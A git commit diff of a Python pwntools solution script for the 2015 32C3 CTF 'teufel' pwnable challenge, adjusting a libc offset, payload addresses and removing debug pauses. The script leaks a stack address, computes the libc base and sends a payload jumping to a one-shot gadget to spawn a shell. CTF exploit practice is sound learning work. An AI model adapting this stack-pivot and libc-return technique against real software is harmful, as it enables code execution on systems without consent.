2d0e18ea4bcd71f01d0d6c37b4b74404cb4d4585
hackability <ktb88@korea.ac.kr>
2017-08-18 21:38:58 -0700

    [mod] sol_teufel.py

--- pwnable/0020_2015_32C3_teufel/sol_teufel.py
+++ pwnable/0020_2015_32C3_teufel/sol_teufel.py
@@ -3,11 +3,9 @@ from pwn import *
 target = "./teufel"
 
 p = process(target)
-e = ELF(target)
 
-#raw_input('')
-
-libc_off = 0x5e8000
+# local ASLR ON - shared library not provided
+libc_off = 0x5f0000
 vul_addr = 0x4004e6
 
 p.send(p64(0xf0))
@@ -23,16 +21,12 @@ rbp = "\x00" + data.split("Z")[1][:-1]
 rbp = u64(rbp.ljust(8, "\x00"))
 libc_base = rbp - libc_off
 one_shot  = libc_base + 0x4526a
-# pop rsi; pop r15; ret : 0xf0784
-ppr       = libc_base + 0xf0784
 ret_again = 0x4004cd
-#one_shot  = libc_base + 0xf0280
 system    = libc_base + 0x45390
 
 print "rbp    : {}".format(hex(rbp))
 print "libc   : {}".format(hex(libc_base))
 print "system : {}".format(hex(system))
-raw_input()
 
 p.send(p64(0xf0))
 payload = p64(0xf0)
@@ -41,11 +35,10 @@ payload += p64(ret_again)
 p.send(payload)
 print p.recv()
 
-raw_input('')
 p.send(p64(0xf0))
 
 payload = p64(0xf0)
-payload += p64(rbp-0x2800)
+payload += p64(rbp-0x800)
 payload += p64(one_shot)
 p.send(payload)
 
